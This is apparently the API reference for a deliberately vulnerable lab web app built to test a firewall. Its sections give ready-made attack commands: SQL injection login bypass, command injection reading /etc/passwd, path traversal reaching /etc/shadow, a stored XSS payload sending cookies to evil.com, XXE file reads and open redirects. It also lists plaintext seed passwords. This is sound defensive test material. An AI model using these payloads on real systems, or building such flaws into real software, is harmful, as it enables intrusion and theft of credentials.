# VM2 Web Application API Reference

Deliberately vulnerable endpoints for NGFW testing. Each endpoint contains intentional security flaws that the NGFW should detect and block.

**Base URL**: `http://10.0.0.5:5000`

## Table of Contents

1. [SQL Injection](#1-sql-injection--login)
2. [Unrestricted File Upload + Malware](#2-unrestricted-file-upload--upload)
3. [Command Injection](#3-command-injection--cmd)
4. [Path Traversal](#4-path-traversal--file)
5. [Stored/Reflected XSS](#5-storedreflected-xss--feedback)
6. [XXE (XML External Entity)](#6-xxe-xml-external-entity--apixml)
7. [Open Redirect](#7-open-redirect--redirect)
8. [Miscellaneous Endpoints](#8-miscellaneous-endpoints)
9. [Middleware](#middleware)

---

## 1. SQL Injection — `/login`

**Vulnerability**: Authentication bypass via unsanitized string interpolation in SQL query.

### GET — Display Login Form

```
GET /login
```

**Response**: HTML login form.

### POST — Authenticate (Vulnerable)

```
POST /login
Content-Type: application/json

{"username": "admin", "password": "admin123"}
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `username` | string | Yes | Username (vulnerable to SQL injection) |
| `password` | string | Yes | Password (stored in plaintext) |

**Vulnerable SQL**:
```sql
SELECT * FROM users WHERE username = '{username}' AND password = '{password}'
```

**Attack Examples**:

```bash
# Bypass authentication
curl -X POST http://10.0.0.5:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1'\''--", "password": "anything"}'

# Alternative bypass
curl -X POST http://10.0.0.5:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''--", "password": ""}'
```

**Success Response** (200):
```json
{"status": "success", "message": "Login successful", "username": "admin"}
```

**Failure Response** (401):
```json
{"status": "error", "message": "Invalid username or password"}
```

### POST — Register

```
POST /register
Content-Type: application/json

{"username": "newuser", "password": "pass123", "email": "test@test.local"}
```

Passwords are stored in plaintext (intentional vulnerability).

### GET — Profile

```
GET /profile
```

Requires active session. Returns user profile.

### GET — Logout

```
GET /logout
```

Clears the session.

---

## 2. Unrestricted File Upload — `/upload`

**Vulnerability**: No file type validation. Any file type can be uploaded. Files are scanned with ClamAV.

### GET — Display Upload Form

```
GET /upload
```

### POST — Upload File (Vulnerable)

```
POST /upload
Content-Type: multipart/form-data

file: <binary file>
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `file` | file | Yes | File to upload (no type restriction) |

**Workflow**:
1. File saved to `/tmp/uploads/`
2. Scanned with ClamAV (or simulation mode if ClamAV unavailable)
3. **Clean** → moved to `uploads/safe/`, DB record created
4. **Infected** → moved to `uploads/quarantine/`, security event logged

**Clean File Response** (200):
```json
{
  "status": "success",
  "message": "File uploaded successfully",
  "filename": "report.pdf",
  "file_hash": "sha256...",
  "scan_result": "clean"
}
```

**Infected File Response** (400):
```json
{
  "status": "error",
  "message": "File is infected and has been quarantined",
  "filename": "malware.exe",
  "file_hash": "sha256...",
  "scan_result": "infected",
  "signature": "EICAR-Test-File"
}
```

**Simulation Mode**: When ClamAV daemon is not running, files with `eicar` in the name or suspicious extensions (`.exe`, `.bat`, `.sh`, `.php`, `.jsp`, `.asp`) are flagged as infected.

### GET — List Uploads

```
GET /uploads
```

Returns HTML page or JSON (`?format=json`).

### GET — Upload Statistics

```
GET /upload/stats
```

```json
{
  "status": "success",
  "total_uploads": 10,
  "clean_uploads": 7,
  "infected_uploads": 3,
  "infection_rate": 30.0
}
```

---

## 3. Command Injection — `/cmd`

**Vulnerability**: User input passed directly to `subprocess.run()` with `shell=True`.

### GET — Display Command Form

```
GET /cmd
```

### POST — Execute Command (Vulnerable)

```
POST /cmd
Content-Type: application/json

{"host": "8.8.8.8"}
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `host` | string | Yes | Passed to `ping -c 4 {host}` |

**Vulnerable Command**:
```bash
ping -c 4 {host}
```

**Attack Examples**:

```bash
# Normal usage
curl -X POST http://10.0.0.5:5000/cmd \
  -d '{"host": "8.8.8.8"}'

# Command injection
curl -X POST http://10.0.0.5:5000/cmd \
  -d '{"host": "8.8.8.8; whoami"}'

# File read
curl -X POST http://10.0.0.5:5000/cmd \
  -d '{"host": "8.8.8.8; cat /etc/passwd"}'
```

**Success Response** (200):
```json
{
  "status": "success",
  "command": "ping -c 4 8.8.8.8; whoami",
  "output": "PING 8.8.8.8...\nubuntuhero\n",
  "return_code": 0
}
```

**Timeout Response** (408):
```json
{"status": "error", "message": "Command execution timeout (10 seconds)"}
```

---

## 4. Path Traversal — `/file`

**Vulnerability**: Reads arbitrary files with no path sanitization.

### GET — Display File Viewer Form

```
GET /file
```

### POST — Read File (Vulnerable)

```
POST /file
Content-Type: application/json

{"filename": "/etc/passwd"}
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `filename` | string | Yes | File path to read (no validation) |

**Attack Examples**:

```bash
# Read system files
curl -X POST http://10.0.0.5:5000/file \
  -d '{"filename": "/etc/passwd"}'

# Relative path traversal
curl -X POST http://10.0.0.5:5000/file \
  -d '{"filename": "../../etc/shadow"}'

# App config
curl -X POST http://10.0.0.5:5000/file \
  -d '{"filename": "config.py"}'
```

**Success Response** (200):
```json
{
  "status": "success",
  "filename": "/etc/passwd",
  "content": "root:x:0:0:root:/root:/bin/bash\n...",
  "size": 1234
}
```

**File Not Found** (200 — returns JSON so AJAX can parse):
```json
{"status": "error", "message": "File not found: /nonexistent"}
```

---

## 5. Stored/Reflected XSS — `/feedback`

**Vulnerability**: User input stored and rendered without HTML escaping.

### GET — Display Feedback Page

```
GET /feedback
GET /feedback?search=<script>alert(1)</script>
```

The `search` parameter is vulnerable to reflected XSS via `Markup()`.

### POST — Submit Feedback (Vulnerable)

```
POST /feedback
Content-Type: application/json

{"name": "Attacker", "message": "<script>alert('XSS')</script>"}
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `name` | string | No | Author name (default: "Anonymous") |
| `message` | string | Yes | Feedback message (no sanitization) |

**Attack Examples**:

```bash
# Stored XSS payload
curl -X POST http://10.0.0.5:5000/feedback \
  -d '{"name": "<img src=x onerror=alert(1)>", "message": "Great site!"}'

# Stored XSS in message
curl -X POST http://10.0.0.5:5000/feedback \
  -d '{"message": "<script>document.location='\''http://evil.com/steal?c='\''+document.cookie</script>"}'

# Reflected XSS in search
curl "http://10.0.0.5:5000/feedback?search=<script>alert(1)</script>"
```

**Success Response** (201):
```json
{"status": "success", "message": "Feedback submitted successfully", "id": 1}
```

### GET — View Single Feedback

```
GET /feedback/1
GET /feedback/1?format=json
```

### DELETE — Delete Feedback

```
DELETE /feedback/1
```

```json
{"status": "success", "message": "Feedback deleted successfully"}
```

---

## 6. XXE (XML External Entity) — `/api/xml`

**Vulnerability**: XML parsed with `resolve_entities=True` and `no_network=False`.

### GET — Display XML Upload Form

```
GET /api/xml
```

### POST — Parse XML (Vulnerable)

Accepts `application/xml`, `text/xml`, form data, or JSON with `xml` field.

```
POST /api/xml
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**Attack Examples**:

```bash
# File read via XXE
curl -X POST http://10.0.0.5:5000/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>'

# XXE via JSON wrapper
curl -X POST http://10.0.0.5:5000/api/xml \
  -H "Content-Type: application/json" \
  -d '{"xml": "<?xml version=\"1.0\"?><root><value>test</value></root>"}'
```

**Success Response** (200):
```json
{
  "status": "success",
  "message": "XML parsed successfully",
  "data": {"root": "test"},
  "root_tag": "root"
}
```

**Error Response** (400):
```json
{"status": "error", "message": "XML syntax error: ..."}
```

---

## 7. Open Redirect — `/redirect`

**Vulnerability**: Redirects to any user-supplied URL without validation.

### GET — Redirect (Vulnerable)

```
GET /redirect?url=http://evil.com/phishing
```

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `url` | string | No | Target URL for redirect (no validation) |

**Attack Examples**:

```bash
# Phishing redirect
curl -I "http://10.0.0.5:5000/redirect?url=http://evil.com/login"

# Protocol-relative redirect
curl -I "http://10.0.0.5:5000/redirect?url=//evil.com"
```

If no `url` parameter is provided, displays an HTML redirect form.

---

## 8. Miscellaneous Endpoints

### `GET /` — Homepage
Renders the index page with live statistics (total requests, uploads, infected files, users).

### `GET /health` — Health Check
```json
{"status": "healthy", "database": "connected", "log_events": 42}
```

### `GET /stats` — Application Statistics
HTML page or JSON (`?format=json`) with request counts, upload counts, recent activity.

### `GET /api/clamav_health` — ClamAV Health Probe
```json
{
  "status": "ok",
  "simulation_mode": true,
  "version": "Simulation mode (ClamAV not available)"
}
```

### `GET /about` — About Page
Project description.

### `GET /help` — Help Page
Usage instructions.

### `GET /success` — Generic Success Page
```
GET /success?message=Done&redirect=/
```

### `GET /error` — Generic Error Page
```
GET /error?error=Something+went+wrong
```

### `GET /old_index` — Old Homepage
Fallback homepage (overridden by `/`).

---

## Middleware

### Rate Limiter
- **Per-session/account**: 100 requests/minute (identified by session UUID or username)
- **Global flood protection**: 50 requests/second site-wide
- **Response**: HTTP 429 with `Retry-After`, `X-RateLimit-*` headers
- **Skipped**: `/health`, `/static/*`

### Request Logger
- Logs every request to the `log_events` database table
- Captures: IP, endpoint, method, payload, user agent, status code, session ID, username, upload results, file hash, response time
- **Skipped**: `/static/*`

### Security Headers
Headers are intentionally relaxed to allow XSS testing:

| Header | Value |
|--------|-------|
| `X-Content-Type-Options` | `nosniff` |
| `X-Frame-Options` | `SAMEORIGIN` |
| `Content-Security-Policy` | `default-src 'self' 'unsafe-inline' 'unsafe-eval'` |
| `X-XSS-Protection` | `0` (disabled) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | `geolocation=(), microphone=(), camera=()` |

---

## Database Models

| Model | Table | Purpose |
|-------|-------|---------|
| `User` | `users` | Authentication (plaintext passwords) |
| `Feedback` | `feedback` | Stored XSS payloads |
| `UploadedFile` | `uploaded_files` | File upload records with ClamAV scan results |
| `LogEvent` | `log_events` | All HTTP request logs |

**Seed Users** (created on first run):

| Username | Password |
|----------|----------|
| `admin` | `admin123` |
| `user` | `password` |
| `test` | `test123` |
| `guest` | `guest` |
